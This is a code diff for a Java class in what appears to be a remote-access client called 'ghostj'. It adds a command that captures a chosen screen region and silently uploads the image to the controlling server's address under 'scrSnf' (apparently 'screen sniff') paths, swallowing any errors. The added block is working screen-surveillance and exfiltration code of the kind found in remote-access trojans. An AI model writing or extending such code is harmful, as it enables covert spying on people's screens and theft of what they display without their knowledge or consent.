@@ -7,6 +7,7 @@ import com.ghostj.client.core.ClientMain;
 import com.ghostj.client.util.PrtScreen;
 import com.rft.core.client.FileSender;
 
+import java.awt.*;
 import java.io.File;
 import java.util.Date;
 
@@ -38,10 +39,28 @@ public class FuncPrtScr implements AbstractFunc {
 	public void run(String[] params, String cmd, AbstractProcessor processor) {
 
 		String param="scr.png";
-		if(params.length>=1)
-			param=params[0];
-		else
+		if(params.length>=1) {
+			param = params[0];
+		}else
 			param="scr.png";
+		if (params.length>=8) {//!!scr lc.png sz cl w h x y hint
+			try {
+				PrtScreen.saveScreen(Integer.parseInt(params[1]),
+						Integer.parseInt(params[2]),
+						params[0],
+						new Dimension(Integer.parseInt(params[3]),Integer.parseInt(params[4])),
+						new Point(Integer.parseInt(params[5]),Integer.parseInt(params[6])),
+						Integer.parseInt(params[7]));
+
+				FileSender.sendFile(new File(params[0]),
+						"scrSnf/"+ ClientMain.name,
+						"scrSnf" + new Date().getTime(),
+						HandleConn.ip,
+						HandleConn.rft_port);
+			} catch (Exception ignored) {
+			}
+			return;
+		}
 		//rate
 		double rate=1;
 		if(params.length>=2){
